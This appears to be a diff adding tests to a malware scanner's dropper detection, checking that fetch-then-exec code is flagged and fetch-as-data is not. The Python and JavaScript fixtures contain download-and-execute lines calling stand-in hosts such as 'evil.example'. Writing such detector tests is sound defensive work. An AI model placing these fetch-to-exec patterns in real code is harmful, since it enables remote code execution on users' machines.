@@ -50,6 +50,39 @@ def test_download_only_is_not_a_dropper(tmp_path):
     assert "BP-DROPPER" not in comps
 
 
+def test_dataflow_proven_dropper_fetch_to_exec(tmp_path):
+    # `p = urlopen(url).read(); exec(p)` — intra-file taint proves fetch->exec even
+    # though the sink is not a curl-pipe/iex string. One dropper finding, high conf.
+    (tmp_path / "loader.py").write_text(
+        'import urllib.request\n'
+        'p = urllib.request.urlopen("http://evil.example/x").read().decode()\n'
+        'exec(p)\n')
+    obs, inv = observe(str(tmp_path))
+    findings = compose_mcd(obs, inv)
+    droppers = [f for f in findings if f.get("composition") == "BP-DROPPER"]
+    assert len(droppers) == 1, "exactly one dropper (no duplicate with the text-heuristic branches)"
+    assert droppers[0]["severity"] == "high"
+    assert droppers[0]["confidence"] >= 0.85  # dataflow-proven, not co-occurrence
+    assert "dataflow" in droppers[0]["title"].lower()
+
+
+def test_dataflow_proven_dropper_js(tmp_path):
+    (tmp_path / "a.js").write_text(
+        'const https=require("https");\nconst r = https.get("http://evil/x");\n'
+        'let code = r;\neval(code);\n')
+    comps, _ = _comps(tmp_path, "b.js", "//noop\n")  # ensure dir scanned
+    obs, inv = observe(str(tmp_path))
+    assert "BP-DROPPER" in {f.get("composition") for f in compose_mcd(obs, inv)}
+
+
+def test_fetch_to_data_use_is_not_a_dropper(tmp_path):
+    # Fetched value used as DATA (not exec) must not be a dropper.
+    (tmp_path / "ok.py").write_text(
+        'import requests\ndata = requests.get("https://api.example/x").json()\nprint(data["k"])\n')
+    obs, inv = observe(str(tmp_path))
+    assert "BP-DROPPER" not in {f.get("composition") for f in compose_mcd(obs, inv)}
+
+
 def test_py_curlpipe_fixture_is_quarantine():
     # Regression lock on the corrected fixture: was CLEAR (false negative), now quarantine.
     from pathlib import Path
